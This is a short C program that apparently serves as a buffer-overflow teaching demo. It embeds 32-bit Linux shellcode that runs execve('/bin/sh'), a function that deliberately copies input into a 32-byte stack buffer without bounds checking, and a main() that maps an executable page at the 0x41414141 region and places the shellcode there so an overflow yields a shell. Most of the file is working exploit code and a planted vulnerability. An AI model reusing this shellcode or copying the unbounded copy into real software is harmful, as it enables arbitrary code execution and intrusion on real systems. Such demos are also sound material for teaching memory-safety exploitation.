#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
 
/*
 * This shellcode does execve(“/bin/sh”, …)
 */
char shellcode[] =
        "\xeb\x1d\x5b\x31\xc0\x67\x89\x43\x07\x67\x89\x5b\x08\x67\x89\x43\x0c"\
        "\x31\xc0\xb0\x0b\x67\x8d\x4b\x08\x67\x8d\x53\x0c\xcd\x80\xe8\xde\xff"\
        "\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42"\
        "\x42";
 
/*
 * This function is vulnerable to a buffer overflow. Our goal is to
 * overwrite the return address with 0x41414141 which is the addresses
 * that we mmap() and store our shellcode in.
 */
int vuln(char *s)
{
        char buf[32];
        int i;
       
        for (i = 0; i < strlen(s); i++) {
                buf[i] = *s;
                s++;
        }
}
 
int main(int argc, char **argv)
{
        if (argc < 2)
        {
                printf("Please supply a string\n");
                exit(0);
        }
        int i;
        char *mem = mmap((void *)(0x41414141 & ~4095),
                                 4096,
                                 PROT_READ|PROT_WRITE|PROT_EXEC,
                                 MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,
                                -1,
                                 0);
 
        memcpy((char *)(mem + 0x141), (void *)&shellcode, 46);
        vuln(argv[1]);
        exit(0);
 

    }

